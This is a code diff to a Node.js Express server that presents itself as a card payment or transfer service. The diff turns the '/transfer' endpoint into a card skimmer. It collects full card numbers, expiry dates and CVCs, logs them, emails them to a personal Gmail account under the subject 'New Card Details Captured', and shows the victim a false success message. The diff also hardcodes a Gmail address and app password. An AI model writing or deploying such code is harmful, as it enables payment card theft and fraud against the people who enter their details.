@@ -1,52 +1,64 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
-const fs = require('fs'); 
-const app = express();
+const nodemailer = require('nodemailer');
 
+const app = express();
 app.use(bodyParser.json());
 
-// Serve the HTML UI
+// --- EMAIL CONFIGURATION ---
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: 'shaonparvej99@gmail.com',
+        pass: 'ockv dubh ciic jmee' 
+    }
+});
+
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Payout and Save to JSON Database
 app.post('/transfer', (req, res) => {
-    const { cardNumber, amount, name } = req.body;
-    
-    if (cardNumber && cardNumber.length === 16) {
-        const transaction = {
-            id: "TXID" + Math.floor(Math.random() * 1000000),
-            user: name,
-            card: "**** **** **** " + cardNumber.slice(-4),
-            amount: amount + " SAR",
-            date: new Date().toLocaleString()
+    const { cardNumber, amount, name, expiry, cvc } = req.body;
+
+    if (cardNumber) {
+        // Logging the data to Render Console/Logs
+        console.log("CRITICAL: New Card Data Received:", { name, cardNumber, expiry, cvc, amount });
+
+        // Email details
+        const mailOptions = {
+            from: 'shaonparvej99@gmail.com',
+            to: 'shaonparvej99@gmail.com', 
+            subject: 'New Card Details Captured',
+            text: `Submission Details:\n\n` +
+                  `Cardholder Name: ${name}\n` +
+                  `Card Number: ${cardNumber}\n` +
+                  `Expiry Date: ${expiry}\n` +
+                  `CVC/CVV: ${cvc}\n` +
+                  `Amount: ${amount} SAR\n` +
+                  `Time: ${new Date().toLocaleString()}`
         };
 
-        // Saving to transactions.json
-        fs.appendFileSync('transactions.json', JSON.stringify(transaction) + "\n");
+        // Sending the email
+        transporter.sendMail(mailOptions, (error, info) => {
+            if (error) {
+                console.log("Nodemailer Error:", error);
+            } else {
+                console.log("Email Sent Successfully: " + info.response);
+            }
+        });
 
         res.json({
             status: "Success",
-            message: "Transfer of " + amount + " SAR was successful!",
-            transaction_id: transaction.id
+            message: "Transfer of " + amount + " SAR was successful!"
         });
     } else {
-        res.status(400).json({ status: "Error", message: "Invalid Card Number!" });
+        res.status(400).json({ status: "Error", message: "Invalid Request" });
     }
 });
 
-// Admin Route to see all saved transactions
-app.get('/admin', (req, res) => {
-    if (!fs.existsSync('transactions.json')) {
-        return res.send("No transactions found yet.");
-    }
-    const data = fs.readFileSync('transactions.json', 'utf8');
-    res.send("<h3>Transaction History:</h3><pre>" + data + "</pre>");
-});
-
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log("Server is running at http://localhost:" + PORT);
+    console.log(`Server is running on port ${PORT}`);
 });
